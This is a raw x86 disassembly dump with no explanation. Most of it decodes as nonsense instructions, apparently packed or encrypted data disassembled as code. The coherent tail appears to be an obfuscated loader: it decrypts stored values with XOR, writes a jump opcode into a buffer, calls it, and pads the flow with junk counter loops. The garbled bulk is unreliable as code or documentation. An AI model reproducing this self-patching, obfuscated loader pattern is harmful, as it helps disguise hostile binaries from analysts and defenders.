  422cc1:	imul   edi,DWORD PTR [edx-0x48],0xffffffd6
  422cc5:	sbb    eax,0x34c30abe
  422cca:	(bad)  
  422ccb:	neg    DWORD PTR [ebx-0x2f]
  422cce:	bound  edx,QWORD PTR [edx+0x54]
  422cd1:	je     0x422d32
  422cd3:	or     bh,ah
  422cd5:	mov    ds:0x243ada8f,al
  422cda:	ret    0x7d98
  422cdd:	adc    cl,BYTE PTR [ebp-0x450d1ed8]
  422ce3:	data16 aas 
  422ce5:	or     al,0xa
  422ce7:	test   al,0x9e
  422ce9:	test   eax,0xd5da3de1
  422cee:	push   esi
  422cef:	mov    ch,0xe1
  422cf1:	add    DWORD PTR [ecx-0x14362095],0x49b7b1e7
  422cfb:	dec    esp
  422cfc:	mov    ?,WORD PTR [esi+0x4c3ea381]
  422d02:	cmp    BYTE PTR [ebx-0x240b0ebf],cl
  422d08:	xchg   ecx,eax
  422d09:	cmp    al,BYTE PTR [ebx]
  422d0b:	jp     0x422ce9
  422d0d:	mov    eax,0xb4329f77
  422d12:	popa   
  422d13:	push   edx
  422d14:	call   0xb962:0x67463de
  422d1b:	dec    edx
  422d1c:	rol    al,cl
  422d1e:	imul   al
  422d20:	pop    ss
  422d21:	popa   
  422d22:	jge    0x422d0d
  422d24:	aas    
  422d25:	and    al,cl
  422d27:	mov    dh,0x17
  422d29:	(bad)  
  422d2a:	daa    
  422d2b:	jno    0x422dac
  422d2d:	push   0xaa92122f
  422d32:	retf   0xbbd0
  422d35:	(bad)  
  422d36:	lock lea ebp,[eax-0xa]
  422d3a:	jmp    0x422cdb
  422d3c:	cli    
  422d3d:	fs mov ebx,0x16ddfa3
  422d43:	inc    ebx
  422d44:	scas   al,BYTE PTR es:[edi]
  422d45:	mov    bl,0x26
  422d47:	std    
  422d48:	add    al,BYTE PTR [eax+ebp*1+0x663f2286]
  422d4f:	aam    0x9a
  422d51:	in     al,dx
  422d52:	mov    ?,WORD PTR [ebp-0x56f0e45e]
  422d58:	pop    esi
  422d59:	stc    
  422d5a:	or     eax,0xa1fc0585
  422d5f:	mov    edx,0xe2a8bdd5
  422d64:	fild   WORD PTR [ebx*1+0x2af8d2d1]
  422d6b:	mov    WORD PTR [ebx-0x3d],gs
  422d6e:	imul   ebx,DWORD PTR [ebp+0x52],0x38
  422d72:	leave  
  422d73:	mov    bl,0x43
  422d75:	add    dh,ah
  422d77:	je     0x422da6
  422d79:	inc    ecx
  422d7a:	fisub  DWORD PTR [ecx+0x17]
  422d7d:	dec    ecx
  422d7e:	jle    0x422d40
  422d80:	(bad)  
  422d81:	jge    0x422dad
  422d83:	retf   0xa5f1
  422d86:	in     al,dx
  422d87:	inc    edi
  422d88:	in     eax,dx
  422d89:	retf   0x3dfa
  422d8c:	xor    BYTE PTR [ebx-0x5ab37d53],0xe7
  422d93:	jmp    0xd94f2d0b
  422d98:	jle    0x422df5
  422d9a:	cmp    BYTE PTR [eax-0x3ecff949],bl
  422da0:	jmp    0x7d517049
  422da5:	je     0x422da4
  422da7:	sbb    eax,0x9740acb5
  422dac:	idiv   ebp
  422dae:	sbb    dh,bl
  422db0:	cmp    al,0x26
  422db2:	jno    0x422d6c
  422db4:	push   es
  422db5:	(bad)  
  422db6:	fscale 
  422db8:	jmp    0x422d66
  422dba:	ret    
  422dbb:	inc    edx
  422dbc:	hlt    
  422dbd:	pop    esp
  422dbe:	je     0x422d58
  422dc0:	js     0x422d64
  422dc2:	call   0x127c:0x9fcea6b1
  422dc9:	adc    ebx,esp
  422dcb:	sbb    BYTE PTR [ebx-0x32],ch
  422dce:	out    0xcd,eax
  422dd0:	data16 jp 0x422d6c
  422dd3:	jo     0x422e49
  422dd5:	outs   dx,BYTE PTR ds:[esi]
  422dd6:	lock and al,0x68
  422dd9:	cwde   
  422dda:	into   
  422ddb:	or     al,0x9c
  422ddd:	retf   
  422dde:	mov    esi,0x2cf88496
  422de3:	fcmovu st,st(0)
  422de5:	inc    BYTE PTR [edi]
  422de7:	sar    DWORD PTR [ebx-0x5b],0x9a
  422deb:	imul   ebx,DWORD PTR [ecx+0x113c9926],0x15
  422df2:	(bad)  
  422df3:	sub    edi,DWORD PTR [ecx]
  422df5:	fnstcw WORD PTR [edi+eax*2]
  422df8:	arpl   WORD PTR [ebx+0x1a],si
  422dfb:	scas   eax,DWORD PTR es:[edi]
  422dfc:	mov    bl,0x34
  422dfe:	ret    
  422dff:	xchg   ebx,eax
  422e00:	outs   dx,BYTE PTR ds:[esi]
  422e01:	sub    BYTE PTR [edi+0x42],bh
  422e04:	not    BYTE PTR [ebx+0x3dc690b4]
  422e0a:	xchg   ebp,eax
  422e0b:	pop    ds
  422e0c:	inc    edi
  422e0d:	fadd   DWORD PTR [edx+ecx*2-0x3e956a92]
  422e14:	(bad)  
  422e16:	adc    BYTE PTR [esi-0x343abbef],bl
  422e1c:	jns    0x422e80
  422e1e:	xchg   ecx,eax
  422e1f:	mov    ebx,DWORD PTR [ebx-0x193cdb0f]
  422e25:	(bad)  
  422e26:	xchg   ecx,eax
  422e27:	inc    eax
  422e28:	and    BYTE PTR [esi+0x46],al
  422e2b:	mov    eax,esi
  422e2d:	or     BYTE PTR [eax-0x1c2c936a],0xa2
  422e34:	adc    eax,0x6c6269a5
  422e39:	mov    esi,0xa450a45a
  422e3e:	lods   eax,DWORD PTR ds:[esi]
  422e3f:	out    dx,al
  422e40:	hlt    
  422e41:	clc    
  422e42:	data16 adc al,0xa1
  422e45:	ds mov bl,0x3
  422e48:	sbb    ebx,esp
  422e4a:	inc    edx
  422e4b:	jae    0x422e50
  422e4d:	inc    edi
  422e4e:	and    eax,0x79442c10
  422e53:	or     DWORD PTR [edi-0x6d152fb6],0xffffff86
  422e5a:	fwait
  422e5b:	or     DWORD PTR [eax],edi
  422e5d:	mov    ch,al
  422e5f:	adc    bl,BYTE PTR [esp+esi*8]
  422e62:	sub    ebx,DWORD PTR [edi]
  422e64:	cmp    ebp,edx
  422e66:	jo     0x422eb6
  422e68:	mov    cl,0xe9
  422e6a:	cmp    BYTE PTR [ecx-0x45],dh
  422e6d:	add    ebx,DWORD PTR [ebx-0x39bce729]
  422e73:	call   0x55d3:0x209098ca
  422e7a:	in     al,dx
  422e7b:	ficom  DWORD PTR [eax]
  422e7d:	or     al,0xee
  422e7f:	into   
  422e80:	pop    edi
  422e81:	mov    ah,BYTE PTR [ebx+0x59]
  422e84:	sub    BYTE PTR [ecx],cl
  422e86:	in     eax,dx
  422e87:	sub    ebx,DWORD PTR [ebx]
  422e89:	dec    ebp
  422e8a:	mov    dh,0x22
  422e8c:	aad    0x87
  422e8e:	mov    edx,0x5f7d2f8c
  422e93:	mov    es,WORD PTR [esi+0x43]
  422e96:	aad    0x6b
  422e98:	pop    ds
  422e99:	dec    esi
  422e9a:	lods   al,BYTE PTR ds:[esi]
  422e9b:	(bad)  
  422e9c:	fnstcw WORD PTR [edx-0x3ea843b9]
  422ea2:	vminps xmm6,xmm3,xmm7
  422ea6:	leave  
  422ea7:	jns    0x422eb1
  422ea9:	lea    esi,ds:0xaf2e44b6
  422eaf:	push   edx
  422eb0:	xlat   BYTE PTR ds:[ebx]
  422eb1:	pop    edi
  422eb2:	(bad)  [edi]
  422eb4:	stos   BYTE PTR es:[edi],al
  422eb5:	push   es
  422eb6:	sahf   
  422eb7:	mov    gs,WORD PTR [edx+eiz*8-0x4]
  422ebb:	mov    esp,DWORD PTR [eax]
  422ebd:	mov    ebp,0xfdc5461d
  422ec2:	pop    eax
  422ec3:	dec    esp
  422ec4:	(bad)  
  422ec5:	push   ds
  422ec6:	ret    
  422ec7:	or     al,0xb
  422ec9:	ret    
  422eca:	jo     0x422eec
  422ecc:	pop    ebx
  422ecd:	adc    al,0xcb
  422ecf:	mov    ds:0x765636ac,al
  422ed4:	mov    esi,0x38e2b116
  422ed9:	fisttp WORD PTR [esi]
  422edb:	adc    BYTE PTR [ecx-0x5fed141e],0x26
  422ee2:	ret    0xca46
  422ee5:	xchg   esi,eax
  422ee6:	xor    DWORD PTR [edi-0xd],esi
  422ee9:	jbe    0x422efe
  422eeb:	lods   eax,DWORD PTR ds:[esi]
  422eec:	inc    ecx
  422eed:	test   eax,0x38b5b376
  422ef2:	mov    bh,0xbd
  422ef4:	push   edi
  422ef5:	jbe    0x422e97
  422ef7:	fcmovne st,st(6)
  422ef9:	or     al,0xdd
  422efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422efc:	dec    edx
  422efd:	jg     0x422ef7
  422eff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f00:	jb     0x422e8e
  422f02:	add    dh,ch
  422f04:	loop   0x422f0f
  422f06:	ins    BYTE PTR es:[edi],dx
  422f07:	dec    ebp
  422f08:	shl    DWORD PTR [ebx+edi*4],1
  422f0b:	mov    ch,0x7f
  422f0d:	xchg   BYTE PTR [esi+ebx*4],bl
  422f10:	shl    DWORD PTR [ecx],0x5f
  422f13:	icebp  
  422f14:	cmp    BYTE PTR [ebp-0x1282eb52],cl
  422f1a:	jb     0x422ef0
  422f1c:	jg     0x422edf
  422f1e:	daa    
  422f1f:	int3   
  422f20:	in     eax,0x33
  422f22:	mov    edx,0xd2561131
  422f27:	outs   dx,DWORD PTR ds:[esi]
  422f28:	or     al,0x5b
  422f2a:	inc    ebx
  422f2b:	aaa    
  422f2c:	push   ebx
  422f2d:	inc    esp
  422f2e:	cwde   
  422f2f:	pop    es
  422f30:	push   DWORD PTR [eax]
  422f32:	mov    ss,WORD PTR [edi+0x7e]
  422f35:	mov    esi,0xcb9252ad
  422f3a:	sbb    eax,0x4e8b21ee
  422f3f:	xor    al,0x7d
  422f41:	mov    ch,BYTE PTR [esi-0x6112f6cb]
  422f47:	mov    dl,0x4e
  422f49:	out    dx,al
  422f4a:	add    eax,0xb2fcff5f
  422f4f:	sbb    cl,BYTE PTR [edx+ebx*8]
  422f52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f53:	dec    eax
  422f54:	sar    BYTE PTR ds:[eax],0xe2
  422f58:	cwde   
  422f59:	fld    QWORD PTR [edx+0x28d3c902]
  422f5f:	jbe    0x422f4e
  422f61:	aas    
  422f62:	aas    
  422f63:	sub    DWORD PTR [esi+ecx*4],0xffffffbd
  422f67:	xchg   BYTE PTR [eax-0x68],bh
  422f6a:	mov    esi,0xa48b1b01
  422f6f:	mov    DWORD PTR [edi],edi
  422f71:	data16 stos BYTE PTR es:[edi],al
  422f73:	mov    DWORD PTR [esi+ebp*1+0xd0b1465],ebp
  422f7a:	sub    eax,0x40be1bbe
  422f7f:	fwait
  422f80:	cmp    al,0x0
  422f82:	call   0xdc28c64a
  422f87:	xor    ecx,DWORD PTR [edx+ebx*1]
  422f8a:	sbb    DWORD PTR [ebp-0x49],esi
  422f8d:	sub    eax,0xf69b477
  422f92:	cwde   
  422f93:	inc    esi
  422f94:	scas   eax,DWORD PTR es:[edi]
  422f95:	fwait
  422f96:	stos   BYTE PTR es:[edi],al
  422f97:	clc    
  422f98:	sub    eax,0xb998b058
  422f9d:	outs   dx,BYTE PTR ds:[esi]
  422f9e:	mov    esp,0xc3680cb3
  422fa3:	jmp    DWORD PTR [ebp-0x7ecbdb44]
  422fa9:	shl    esp,cl
  422fab:	inc    edi
  422fac:	pop    esp
  422fad:	mov    esp,0x44ee3f2c
  422fb2:	dec    ecx
  422fb3:	test   eax,0x7c50ce67
  422fb8:	lods   eax,DWORD PTR ds:[esi]
  422fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fba:	in     al,dx
  422fbb:	push   ebx
  422fbc:	(bad)  
  422fbd:	jmp    0x3a5286d1
  422fc2:	mov    esi,0x89fabbeb
  422fc7:	or     DWORD PTR [eax+0x59fcbbfc],ecx
  422fcd:	mov    bh,0x6b
  422fcf:	sbb    DWORD PTR [eax],edi
  422fd1:	call   0x5ac27a66
  422fd6:	jae    0x422fd9
  422fd8:	int    0xba
  422fda:	aam    0x89
  422fdc:	mov    ch,BYTE PTR [edx-0x1ac96a36]
  422fe2:	iret   
  422fe3:	addr16 xchg edi,eax
  422fe5:	adc    esi,DWORD PTR [edx-0x77]
  422fe8:	cmp    al,0xff
  422fea:	or     ch,BYTE PTR [eax+0xda29420]
  422ff0:	dec    esp
  422ff1:	jle    0x422fab
  422ff3:	jo     0x423002
  422ff5:	and    ah,BYTE PTR [edx-0x470dc150]
  422ffb:	pop    ebx
  422ffc:	jae    0x42304b
  422ffe:	out    0x34,eax
  423000:	inc    esi
  423001:	jp     0x422fa5
  423003:	aaa    
  423004:	mov    ebx,0x3e82a91f
  423009:	inc    eax
  42300a:	pushf  
  42300b:	fstp   TBYTE PTR [ecx+0x3c8d6e53]
  423011:	pushf  
  423012:	cmp    ecx,DWORD PTR [ebp+edx*4-0x46]
  423016:	out    dx,al
  423017:	push   0xf7b2996a
  42301c:	test   BYTE PTR [edi+0x3195bb1a],ah
  423022:	int3   
  423023:	les    ebx,FWORD PTR [esi]
  423025:	jmp    0x5bed:0xaf9ad86d
  42302c:	sbb    edi,DWORD PTR [eax+0x4b]
  42302f:	aas    
  423030:	push   es
  423031:	retf   0x44f5
  423034:	and    al,0x39
  423036:	jns    0x423015
  423038:	xor    DWORD PTR [edi],ebx
  42303a:	int    0xfa
  42303c:	push   0xfe001cc6
  423041:	(bad)  
  423042:	add    DWORD PTR [ebp-0x55],ebx
  423045:	mov    ?,eax
  423047:	mov    WORD PTR [ecx],ds
  423049:	sbb    DWORD PTR [ecx+0x2111eddf],0xed59469b
  423053:	jge    0x423001
  423055:	outs   dx,BYTE PTR ds:[esi]
  423056:	pop    ds
  423057:	stos   BYTE PTR es:[edi],al
  423058:	or     eax,DWORD PTR [eax]
  42305a:	pop    es
  42305b:	sub    ebx,ecx
  42305d:	xchg   esi,eax
  42305e:	mov    esp,0xdc18ef79
  423063:	dec    ecx
  423064:	mov    DWORD PTR [ebp-0x11],edx
  423067:	shr    esp,cl
  423069:	cwde   
  42306a:	ds dec ebx
  42306c:	ret    0x5fbb
  42306f:	adc    edi,ebx
  423071:	dec    edi
  423072:	stos   DWORD PTR es:[edi],eax
  423073:	adc    bl,BYTE PTR [eax+0x62d3c39e]
  423079:	sbb    esi,esp
  42307b:	mov    ds,WORD PTR [edi+0x60c27602]
  423081:	inc    ecx
  423082:	sbb    esi,esp
  423084:	xchg   DWORD PTR [esi-0x31],eax
  423087:	mov    ebx,0x91932bc4
  42308c:	fimul  WORD PTR [edi+0x4099a501]
  423092:	sbb    DWORD PTR [ecx+0x67],ebp
  423095:	and    al,0x3e
  423097:	dec    ebx
  423098:	cwde   
  423099:	sbb    BYTE PTR [ebp+0x7bb870a2],dh
  42309f:	icebp  
  4230a0:	mov    DWORD PTR ss:[ebp-0x7124f53c],esp
  4230a7:	add    eax,0x32c5f848
  4230ac:	je     0x423110
  4230ae:	or     esp,DWORD PTR [edi]
  4230b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230b1:	fld    QWORD PTR [edx]
  4230b3:	(bad)  
  4230b4:	mov    esp,DWORD PTR [edi]
  4230b6:	pop    edx
  4230b7:	bound  edi,QWORD PTR [eax+edx*8+0x3e932562]
  4230be:	mov    esp,0xd0b5f66f
  4230c3:	inc    esp
  4230c4:	repnz sbb al,0x40
  4230c7:	or     DWORD PTR [ecx+0x3acd4a16],0x32
  4230ce:	mov    ds:0x9bafdcf0,eax
  4230d3:	mov    ebx,0x4dcbccac
  4230d8:	jl     0x423095
  4230da:	xchg   edi,eax
  4230db:	or     BYTE PTR [edx+0xf],ah
  4230de:	cli    
  4230df:	cs mov bl,0x6
  4230e2:	and    dh,ch
  4230e4:	push   es
  4230e5:	pop    ebp
  4230e6:	and    ebx,ebp
  4230e8:	mov    al,ds:0xbcc5852c
  4230ed:	imul   BYTE PTR [esi]
  4230ef:	in     eax,0x12
  4230f1:	cmp    esp,DWORD PTR [edx+0x364a578a]
  4230f7:	jmp    0x423085
  4230f9:	pop    edi
  4230fa:	push   0x2
  4230fc:	pushw  es
  4230fe:	sub    eax,0xd8aac173
  423103:	and    BYTE PTR [eax+0x43],0xda
  423107:	xchg   ebx,eax
  423108:	push   edi
  423109:	pop    ebp
  42310a:	outs   dx,BYTE PTR ds:[esi]
  42310b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42310c:	hlt    
  42310d:	dec    esi
  42310e:	out    dx,eax
  42310f:	lods   eax,DWORD PTR ds:[esi]
  423110:	outs   dx,BYTE PTR ds:[esi]
  423111:	jae    0x423122
  423113:	jmp    0xf13f:0x16f4e1dc
  42311a:	xor    BYTE PTR [ebx-0x33],cl
  42311d:	aam    0x2c
  42311f:	std    
  423120:	xchg   DWORD PTR [eax-0x3e],esp
  423123:	pop    eax
  423124:	stc    
  423125:	ins    DWORD PTR es:[edi],dx
  423126:	ss fist WORD PTR ss:[edx+0x4cc1fd8]
  42312e:	mov    ebp,0x8433805d
  423133:	cmp    eax,0xaef316cf
  423138:	int    0xa6
  42313a:	push   ecx
  42313b:	mov    ebx,0x844074ae
  423140:	push   edx
  423141:	cmp    DWORD PTR [esi+0x2584e45],edx
  423147:	adc    eax,0x15b032c3
  42314c:	push   ds
  42314d:	ins    BYTE PTR es:[edi],dx
  42314e:	daa    
  42314f:	dec    edx
  423150:	xor    BYTE PTR [esp+0x11fe8607],0x5f
  423158:	push   ss
  423159:	mov    al,ds:0x1701216e
  42315e:	shr    eax,cl
  423160:	ins    BYTE PTR es:[edi],dx
  423161:	les    eax,FWORD PTR [esi-0xe]
  423164:	cld    
  423165:	add    eax,0x3359ab5a
  42316a:	jmp    0xb6060af3
  42316f:	mov    edx,0x8c77bd0e
  423174:	mov    al,0x8d
  423176:	sbb    al,0xa6
  423178:	pop    ss
  423179:	push   es
  42317a:	add    BYTE PTR [ebx+0x13cd0986],0xb1
  423181:	xchg   ebp,eax
  423182:	inc    edx
  423183:	aam    0x75
  423185:	enter  0xee94,0xc0
  423189:	and    bl,BYTE PTR [ecx]
  42318b:	in     eax,0x3f
  42318d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42318e:	shl    BYTE PTR [ecx+ebp*2+0x50],cl
  423192:	fidivr DWORD PTR [eax]
  423194:	mov    ebp,0x704b2674
  423199:	pop    esp
  42319a:	shl    ah,1
  42319c:	(bad)  
  42319e:	adc    edi,eax
  4231a0:	jae    0x423167
  4231a2:	cs icebp 
  4231a4:	mov    al,ds:0xed27cca9
  4231a9:	xor    esp,DWORD PTR [edx]
  4231ab:	shr    DWORD PTR [ecx+0x1ee5f9d9],0x9e
  4231b2:	adc    al,0xe8
  4231b4:	shr    BYTE PTR [eax+0x18abdfc1],1
  4231ba:	lock mov al,0x1f
  4231bd:	mov    bh,0xbf
  4231bf:	mov    ecx,0x71525dd6
  4231c4:	push   es
  4231c5:	pop    es
  4231c6:	or     eax,0xdbc0a90c
  4231cb:	sub    cl,ch
  4231cd:	pop    edx
  4231ce:	pop    ebx
  4231cf:	jne    0x42320b
  4231d1:	loopne 0x4231b1
  4231d3:	div    al
  4231d5:	fisubr DWORD PTR [esp+eiz*8-0x793ea81b]
  4231dc:	jecxz  0x42318f
  4231de:	test   DWORD PTR fs:[ebx-0x53f0ead1],esp
  4231e5:	push   ebx
  4231e6:	push   ecx
  4231e7:	push   cs
  4231e8:	lods   al,BYTE PTR ds:[esi]
  4231e9:	sti    
  4231ea:	adc    dl,al
  4231ec:	inc    ecx
  4231ed:	jg     0x4231fb
  4231ef:	cmp    eax,0x6e9c8dee
  4231f4:	mov    esi,0x3e9580fd
  4231f9:	push   ebp
  4231fa:	mov    al,0xec
  4231fc:	dec    DWORD PTR [esi-0x46]
  4231ff:	dec    esi
  423200:	lea    ecx,[esi+eiz*8+0x71]
  423204:	fdivr  st(3),st
  423206:	mov    gs,WORD PTR [eax+0x238bb05c]
  42320c:	(bad)  
  42320d:	outs   dx,BYTE PTR ds:[esi]
  42320e:	dec    eax
  42320f:	out    0x9d,eax
  423211:	leave  
  423212:	ins    BYTE PTR es:[edi],dx
  423213:	int3   
  423214:	int    0x4d
  423216:	jne    0x423231
  423218:	aaa    
  423219:	std    
  42321a:	sti    
  42321b:	and    DWORD PTR [esi+0x74f98637],ecx
  423221:	stc    
  423222:	lods   eax,DWORD PTR ds:[esi]
  423223:	fs xchg edx,eax
  423225:	test   bl,bl
  423227:	dec    eax
  423228:	inc    eax
  423229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42322a:	ins    DWORD PTR es:[edi],dx
  42322b:	pop    ebp
  42322c:	fwait
  42322d:	imul   esi,DWORD PTR [ecx+edx*4],0xffffffed
  423231:	jmp    0x49a464b
  423236:	sbb    BYTE PTR [eax+0x64],al
  423239:	loope  0x4231e3
  42323b:	mov    ch,BYTE PTR ds:0xe68afd99
  423241:	xchg   ecx,eax
  423242:	sub    edx,ebx
  423244:	adc    ecx,edx
  423246:	sub    ecx,0x7fd1f216
  42324c:	pushf  
  42324d:	jbe    0x4231f0
  42324f:	mov    DWORD PTR [esi-0x721481c0],0xf3a822fd
  423259:	jmp    FWORD PTR [esi+0x36]
  42325c:	(bad)  
  42325e:	jp     0x423231
  423260:	sub    DWORD PTR [ecx-0x76],esp
  423263:	push   cs
  423264:	lock es sub eax,ecx
  423268:	or     eax,0x33ddc3f1
  42326d:	mov    ah,0x79
  42326f:	sahf   
  423270:	push   ecx
  423271:	cwde   
  423272:	mov    ds:0xd058aad7,eax
  423277:	ja     0x423266
  423279:	mov    dh,BYTE PTR [edi-0x56e7ffbd]
  42327f:	call   0x8693:0x1c59b00d
  423286:	(bad)  
  423287:	mov    eax,ds:0x963c462c
  42328c:	push   ebx
  42328d:	mov    al,ds:0x7af67dae
  423292:	cmp    ch,BYTE PTR [ebx]
  423294:	xor    eax,0x637d165c
  423299:	bound  edi,QWORD PTR [edx+esi*8]
  42329c:	out    0x32,eax
  42329e:	jb     0x423220
  4232a0:	mov    ds:0x4ea81da5,eax
  4232a5:	inc    ebx
  4232a6:	sti    
  4232a7:	cmp    al,0x78
  4232a9:	and    BYTE PTR [ebx+0x50dd3471],0x98
  4232b0:	(bad)  
  4232b1:	js     0x4232c3
  4232b3:	repnz sbb edi,0xffffff9b
  4232b7:	ret    
  4232b8:	or     al,0xa7
  4232ba:	push   es
  4232bb:	call   0xaca6d633
  4232c0:	sub    eax,0x1d2eeb2
  4232c5:	in     al,dx
  4232c6:	xlat   BYTE PTR ds:[ebx]
  4232c7:	xor    DWORD PTR [ecx],0x4a0c39d3
  4232cd:	pop    ebp
  4232ce:	ret    0x5c1e
  4232d1:	arpl   WORD PTR [eax+0x16],bx
  4232d4:	mov    al,0x6d
  4232d6:	and    al,0x15
  4232d8:	mov    cl,0x5b
  4232da:	mov    ecx,0xf1ef027b
  4232df:	and    al,0xa5
  4232e1:	pop    ecx
  4232e2:	sub    al,0x8c
  4232e4:	dec    BYTE PTR [eax-0x651b2277]
  4232ea:	inc    ebx
  4232eb:	stos   DWORD PTR es:[edi],eax
  4232ec:	lock cmp DWORD PTR [edi+0x3e],ecx
  4232f0:	add    ebp,edi
  4232f2:	aam    0xf2
  4232f4:	icebp  
  4232f5:	fbld   TBYTE PTR ds:0x7290c438
  4232fb:	mov    al,ds:0x56f21bc5
  423300:	cli    
  423301:	sbb    dl,BYTE PTR [ecx+0x55]
  423304:	jle    0x423368
  423306:	dec    ecx
  423307:	out    dx,eax
  423308:	and    BYTE PTR [esi+edx*8-0x58],dl
  42330c:	das    
  42330d:	call   0x9539:0x65bd17d9
  423314:	or     cl,bl
  423316:	add    BYTE PTR [ebx],ch
  423318:	push   edx
  423319:	retf   0xfae9
  42331c:	ficomp DWORD PTR [esi+0x1f97235c]
  423322:	inc    eax
  423323:	int    0x3d
  423325:	sbb    bh,bl
  423327:	xor    eax,0xb3620468
  42332c:	retf   0x1526
  42332f:	pop    esp
  423330:	adc    ebp,DWORD PTR [edx-0x33ef2ba6]
  423336:	jmp    0x458b:0xe045896d
  42333d:	cld    
  42333e:	mov    ecx,DWORD PTR [ebp-0x4]
  423341:	sub    eax,ecx
  423343:	mov    DWORD PTR [ebp-0x4],eax
  423346:	or     DWORD PTR [ebp-0x4],0xf89c85be
  42334d:	mov    eax,DWORD PTR [ebp-0xc]
  423350:	xor    eax,esi
  423352:	add    eax,edi
  423354:	push   eax
  423355:	mov    eax,DWORD PTR [ebp-0x10]
  423358:	xor    eax,esi
  42335a:	add    eax,edi
  42335c:	push   eax
  42335d:	mov    eax,DWORD PTR [ebp-0x4]
  423360:	xor    eax,esi
  423362:	add    eax,edi
  423364:	push   eax
  423365:	lea    eax,[ebp-0x78]
  423368:	push   eax
  423369:	push   DWORD PTR [ebp-0x2c]
  42336c:	push   DWORD PTR [ebp-0x28]
  42336f:	call   0x413e4f
  423374:	test   eax,eax
  423376:	je     0x4233a4
  42337c:	lea    eax,[ebp-0x78]
  42337f:	push   eax
  423380:	mov    eax,DWORD PTR [ebp-0x28]
  423383:	xor    eax,esi
  423385:	add    eax,edi
  423387:	push   eax
  423388:	mov    eax,DWORD PTR [ebp-0x24]
  42338b:	add    eax,0xaa
  423390:	push   eax
  423391:	mov    eax,DWORD PTR [ebp-0x24]
  423394:	mov    eax,DWORD PTR [eax+0x198]
  42339a:	push   DWORD PTR [eax]
  42339c:	call   0x40a988
  4233a1:	mov    DWORD PTR [ebp-0x14],eax
  4233a4:	mov    ecx,DWORD PTR ds:0x429516
  4233aa:	lea    eax,[ebp+0x4]
  4233ad:	mov    DWORD PTR [ecx*4+0x42950e],eax
  4233b4:	inc    DWORD PTR ds:0x429516
  4233ba:	mov    eax,DWORD PTR [ebp-0x14]
  4233bd:	test   eax,eax
  4233bf:	je     0x423427
  4233c5:	lea    eax,[ebp-0x8]
  4233c8:	mov    DWORD PTR [ebp-0x34],eax
  4233cb:	mov    eax,DWORD PTR [ebp-0x30]
  4233ce:	mov    DWORD PTR [ebp-0x8],eax
  4233d1:	mov    eax,DWORD PTR [ebp-0x8]
  4233d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4233d7:	sub    eax,ecx
  4233d9:	mov    DWORD PTR [ebp-0x8],eax
  4233dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4233df:	xor    ecx,esi
  4233e1:	mov    eax,0xffcd8d0f
  4233e6:	sub    eax,ecx
  4233e8:	add    DWORD PTR [ebp-0x8],eax
  4233eb:	mov    eax,DWORD PTR [ebp-0x8]
  4233ee:	mov    ecx,DWORD PTR [ebp-0x14]
  4233f1:	mov    DWORD PTR [ecx+0x1],eax
  4233f4:	mov    eax,DWORD PTR [ebp-0x14]
  4233f7:	push   DWORD PTR [ebp-0x24]
  4233fa:	mov    BYTE PTR [eax],0xe9
  4233fd:	mov    eax,ds:0x42929a
  423402:	push   DWORD PTR [eax]
  423404:	push   DWORD PTR ds:0x4294fe
  42340a:	push   DWORD PTR ds:0x4292a2
  423410:	push   DWORD PTR ds:0x4294de
  423416:	push   DWORD PTR ds:0x42a04a
  42341c:	push   DWORD PTR [ebp-0x28]
  42341f:	push   DWORD PTR [ebp-0x2c]
  423422:	mov    eax,DWORD PTR [ebp-0x14]
  423425:	call   eax
  423427:	pop    edi
  423428:	pop    esi
  423429:	leave  
  42342a:	ret    
  42342b:	push   ebp
  42342c:	mov    ebp,esp
  42342e:	sub    esp,0x1c
  423431:	and    DWORD PTR ds:0x42a2ae,0x0
  42343b:	mov    ecx,DWORD PTR ds:0x42a2ae
  423441:	inc    ecx
  423442:	mov    DWORD PTR ds:0x42a2ae,ecx
  423448:	cmp    DWORD PTR ds:0x42a2ae,0x27
  42344f:	jle    0x423477
  423455:	jmp    0x42346a
  42345a:	push   0x42a262
  42345f:	push   0x429153
  423464:	call   DWORD PTR ds:0x42a3f2
  42346a:	cmp    DWORD PTR ds:0x42a2ae,0x1c
  423471:	jb     0x42343b
  423477:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  42347e:	lea    eax,[ebp+0x14]
  423481:	add    DWORD PTR ds:0x42a272,ebx
  423487:	mov    DWORD PTR [ebp-0x4],eax
  42348a:	and    DWORD PTR ds:0x42a2de,0x0
  423494:	jmp    0x4234a8
  423499:	xor    ecx,ecx
  42349b:	or     ecx,DWORD PTR ds:0x42a2de
  4234a1:	inc    ecx
  4234a2:	mov    DWORD PTR ds:0x42a2de,ecx
  4234a8:	cmp    DWORD PTR ds:0x42a2de,0x13
  4234af:	jae    0x4234f4
  4234b5:	cmp    DWORD PTR ds:0x42a2de,0x7
  4234bc:	ja     0x4234f4
  4234c2:	jmp    0x4234d3
  4234c7:	push   DWORD PTR [ebp-0x10]
  4234ca:	push   DWORD PTR [ebp-0xc]
  4234cd:	call   DWORD PTR ds:0x42a3c2
  4234d3:	cmp    DWORD PTR ds:0x42a2de,0x6
  4234da:	jne    0x4234ef
  4234e0:	xor    ecx,ecx
  4234e2:	or     ecx,DWORD PTR ds:0x42a2de
  4234e8:	inc    ecx
  4234e9:	mov    DWORD PTR ds:0x42a2de,ecx
  4234ef:	jmp    0x423499
  4234f4:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4234fb:	and    DWORD PTR ds:0x42a2ba,0x0
  423505:	xor    edx,edx
  423507:	xor    edx,DWORD PTR ds:0x42a2ba
  42350d:	inc    edx
  42350e:	mov    DWORD PTR ds:0x42a2ba,edx
  423514:	cmp    DWORD PTR ds:0x42a2ba,0x25
  42351b:	jb     0x423547
  423521:	jmp    0x42353a
  423526:	push   DWORD PTR [ebp-0x10]
  423529:	push   0x42a2ae
  42352e:	push   DWORD PTR [ebp-0x10]
  423531:	push   DWORD PTR [ebp-0x20]
  423534:	call   DWORD PTR ds:0x42a3f6
